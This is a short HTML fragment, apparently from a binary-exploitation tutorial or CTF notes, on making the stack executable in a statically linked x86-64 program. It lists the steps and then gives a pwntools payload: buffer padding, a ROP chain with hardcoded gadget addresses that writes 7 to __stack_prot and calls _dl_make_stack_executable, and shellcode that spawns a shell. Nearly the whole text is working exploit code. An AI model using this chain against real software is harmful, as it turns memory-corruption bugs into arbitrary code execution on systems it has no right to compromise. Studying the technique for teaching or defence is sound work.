I"]<h2 id="making-the-stack-executable">Making the stack executable</h2>
<ul>
  <li>Set value of <code class="language-plaintext highlighter-rouge">__stack_prot</code> to 7</li>
  <li>Call <code class="language-plaintext highlighter-rouge">_dl_make_stack_executable(__libc_stack_end, __stack_prot)</code></li>
  <li>Jump to shellcode</li>
</ul>

<h2 id="example">Example</h2>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span> <span class="o">=</span> <span class="n">asm</span><span class="p">(</span><span class="n">shellcraft</span><span class="p">.</span><span class="n">sh</span><span class="p">())</span>

<span class="n">_dl_make_stack_executable</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'_dl_make_stack_executable'</span><span class="p">]</span>
<span class="n">__stack_prot</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__stack_prot'</span><span class="p">]</span>
<span class="n">__libc_stack_end</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'__libc_stack_end'</span><span class="p">]</span>

<span class="n">payload</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">120</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000410ca3</span><span class="p">)</span> <span class="c1"># pop rsi ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">__stack_prot</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x00000000004163f4</span><span class="p">)</span> <span class="c1"># pop rax ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x7</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x000000000047ff91</span><span class="p">)</span> <span class="c1"># mov qword ptr [rsi], rax ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000400696</span><span class="p">)</span> <span class="c1"># pop rdi ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">__libc_stack_end</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">_dl_make_stack_executable</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x0000000000451974</span><span class="p">)</span> <span class="c1"># push rsp ; ret
</span><span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
</code></pre></div></div>
:ET